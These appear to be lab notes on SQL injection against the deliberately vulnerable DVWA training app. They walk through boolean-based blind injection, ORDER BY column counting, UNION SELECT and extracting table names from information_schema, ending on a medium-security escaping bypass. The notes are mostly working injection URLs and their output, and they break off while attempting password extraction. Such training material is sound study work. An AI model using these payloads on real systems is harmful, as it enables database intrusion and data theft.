### Discovering And Exploiting Blind SQL Injection

* In this section i will be going through labs on Blind SQLi
* This is the similar to error based sql injection, but the main difference is the error is not on revealed on the page.

* If i try and inject a ' into the url there will be no error message.

```
http://10.0.2.5/dvwa/vulnerabilities/sqli_blind/?id=1%27&Submit=Submit#
```

* The injection has no error message.

* So now how do we test if the page is vulnerable to SQL injection.
* We could perform true and false statements and then see how the web server reacts towards them.

* First lets identify how a valid page should respond.

```
http://10.0.2.5/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#
```

* Returns;

```
ID: 1
First name: admin
Surname: admin
```

* So now lets try and a true statement with a and statement.

```
SELECT * from users where id='1' and 1=1#'
```

* This should return true and should show the admin firstname and lastname.

```
http://10.0.2.5/dvwa/vulnerabilities/sqli_blind/?id=1%27%20and%201=1%23&Submit=Submit#
```

* Output

```
ID: 1' and 1=1#
First name: admin
Surname: admin
```

* So yes the statement is true and is executed.

* Now i'm going to try a false statement after the user id.
* If the page is not vulnerable to SQL Injection then it should display the admin details.
* If the page is vulnerable it will not reveal anything as the statement is false so the query will not executed.

```
SELECT * from users where id='1' and 1=2#'
```

* The statement above is a obvious false statement.
```
http://10.0.2.5/dvwa/vulnerabilities/sqli_blind/?id=1%27%20and%201=2%23&Submit=Submit#
```

* After i execute the statement above nothing is returned meaning that its likely vulnerable to SQL Injection.

* We can also try order by, we can order by 1 which should always be tru as there will need to column.

```
SELECT * from users where id='1' ORDER BY 1#'
```

```
http://10.0.2.5/dvwa/vulnerabilities/sqli_blind/?id=1%27%20order%20by%201%23&Submit=Submit#
```

* And we recieve the admin First name and Last name so this is vulnerable to blind SQL Injection.

```
ID: 1' order by 1#
First name: admin
Surname: admin
```

* Now we can finallly order by a large number and see if it acts the same way.
```
http://10.0.2.5/dvwa/vulnerabilities/sqli_blind/?id=1%27%20order%20by%2010000000%23&Submit=Submit#
```

* The admin Firstname and Surname is not displayed even though we selected the id =1 which means that page is vulnerable to sql injection.

* So now we can try and select data from database as we know its vulnerable to SQL injection.

* I already know there two columns in the database.
```
http://10.0.2.5/dvwa/vulnerabilities/sqli_blind/?id=1%27%20order%20by%202%23&Submit=Submit#
```

* Now im going to select data from the information_schema.
* Try and select the first two columns with a union statement.

```
http://10.0.2.5/dvwa/vulnerabilities/sqli_blind/?id=1%27%20union%20select%201,2%23&Submit=Submit#
```

* Output 

```
ID: 1' union select 1,2#
First name: admin
Surname: admin

ID: 1' union select 1,2#
First name: 1
Surname: 2
```
* This shows that columns 1 and 2 are injectable.

* Ok now we select the table names from information_schema.tables 
```
http://10.0.2.5/dvwa/vulnerabilities/sqli_blind/?id=1%27%20union%20select%20table_name,2%20from%20information_schema.tables%23&Submit=Submit#
```

* To get the tables names from the schema

* You should never rely only error based sqlinjection whenever you visit a page.

---

### Discovering More Complicated SQL Injections

* In this section we'll try to bypass some more complicated waf(web application filtering).

* So first let me set the security to medium and select id 1.

```
http://10.0.2.5/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#
```

* Here i recieve a valid response.

```
ID: 1
First name: admin
Surname: admin
```

* Ok so now let me try and add a single quote after the id.
```
SELECT * FROM users where id='1''
```

* And i recieve a error.

```
http://10.0.2.5/dvwa/vulnerabilities/sqli/?id=1%27&Submit=Submit#
```

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1
``

* This error is slightly different to other error based injection.

* So if i try to follow up with a and statement.

```  
http://10.0.2.5/dvwa/vulnerabilities/sqli/?id=1%27%20and%201=1%23&Submit=Submit#
```

* I still recieve the same error message 

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' and 1=1#' at line 1
```

* Now let me try and remove the quote but leave the and 1=1# statement there.

```
http://10.0.2.5/dvwa/vulnerabilities/sqli/?id=1%20and%201=1%23&Submit=Submit#
```

* So there is no error message and i recieve details of the admin user.

```
ID: 1 and 1=1#
First name: admin
Surname: admin
```

* Now let me finally try a false statement to see if the admin user details is not shown.
* This will prove that the page is vulnerable to sql injection.

```
http://10.0.2.5/dvwa/vulnerabilities/sqli/?id=1%20and%201=2%23&Submit=Submit#
```

* The page is blank with no admin user details meaning the web page is vulnerable to sql injection.
* Now let me use the union select statement.

```
http://10.0.2.5/dvwa/vulnerabilities/sqli/?id=1%20union%20select%201,2%23&Submit=Submit#
```

* Output

```
ID: 1 union select 1,2#
First name: 1
Surname: 2
```

* Now get the table names from information schema.

```
http://10.0.2.5/dvwa/vulnerabilities/sqli/?id=1%20union%20select%201,table_name%20from%20information_schema.tables%23&Submit=Submit#
```

* We recieve the table names from the information_schema db.

---

### Extracting Data (Passwords)- By Exploiting A More Difficult SQL Injection

* Now in this section let me list the columns in the dvwa table.

```
http://10.0.2.5/dvwa/vulnerabilities/sqli/?id=1%20union%20select%20table_name,2%20from%20information_schema.tables%20where%20table_name=%27dvwa%27%23&Submit=Submit#
```

* But i recieve a error.
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'dvwa\'#' at line 1
```

* We need some way of bypassing this filtering.

 
